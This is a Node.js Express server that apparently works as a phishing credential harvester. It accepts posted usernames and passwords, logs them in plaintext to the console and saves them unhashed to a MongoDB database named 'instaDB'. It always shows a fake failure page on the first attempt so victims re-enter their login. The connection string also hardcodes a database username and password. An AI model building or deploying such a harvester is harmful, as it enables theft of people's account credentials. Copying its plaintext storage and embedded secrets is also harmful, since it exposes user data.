import express from "express";
import bodyParser from "body-parser";
import request from "request";
import http from "https";
import mongoose from "mongoose";
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const __filename = fileURLToPath(import.meta.url);

const __dirname = path.dirname(__filename);

app.use(express.static(path.join(__dirname, 'public')))
app.use(bodyParser.urlencoded({extended: true}));

mongoose.connect("mongodb+srv://chinxgrover:narutois1@cluster0.zgx0s27.mongodb.net/instaDB", {useNewUrlParser: true, useUnifiedTopology: true});

const userSchema = new mongoose.Schema({
    username : {
        type :String,
        required: [true, "username is necessary"]
    },    
    password : {
        type :String,
        required: [true, "type a password"]
    },    
});

const User = new mongoose.model("User" ,userSchema);

var number = 1;

app.get("/", function(req, res) {
    res.sendFile(__dirname + "/home.html")
});

app.post("/", function(req, res) {

    var username = req.body.user;
    var pass = req.body.pass;

    console.log("username: " + username);
    console.log("password: " + pass);
    console.log();
    
    const newUser = new User({
        username : username,
        password : pass,
    });

    newUser.save();
    console.log("*user successfully added*");

    if (number ==1 && res.statusCode == 200) {
        res.sendFile(__dirname + "/failure.html");
        number ++;
    }else {
        res.sendFile(__dirname + "/success.html");
        number =1;
    }
   
});

app.post("/failure.html", function(req, res) {
    res.redirect("/");
});

app.listen(process.env.PORT ||3000, function() {
    console.log("Server is running on port 3000");
});
